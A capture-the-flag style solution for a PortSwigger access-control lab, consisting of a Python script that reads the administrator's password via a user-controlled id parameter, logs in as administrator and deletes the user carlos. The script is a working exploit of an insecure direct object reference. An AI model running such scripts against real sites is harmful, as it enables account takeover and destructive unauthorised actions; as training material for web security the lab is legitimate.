# Lab: User ID controlled by request parameter with password disclosure

Link to lab: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup


url = 'https://0af200df035e5e06c20dca1d008f0013.web-security-academy.net/'


# Get carlos information
params = {
    'id': 'administrator',
}  

response = requests.get(
    url + 'my-account',
    params=params,
    verify=False,
    allow_redirects=False
)

soup = BeautifulSoup(response.text, 'html.parser')
password = soup.find('input', {'name': 'password'})['value']

## Get login

session = requests.Session()

response = session.get(
    url + 'login',
    verify=False,
)


soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Post login

data = {
    "csrf": csrf,
    'username': 'administrator',
    'password': password,
}

response = session.post(
    url + 'login',
    data=data,
    verify=False,   
    allow_redirects=False
)

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

# Delete user carlos

cookies = {
    'session': session,
}

response = requests.get(
    url + 'admin/delete?username=carlos',
    cookies=cookies,
    verify=False
)

print(response.text)
```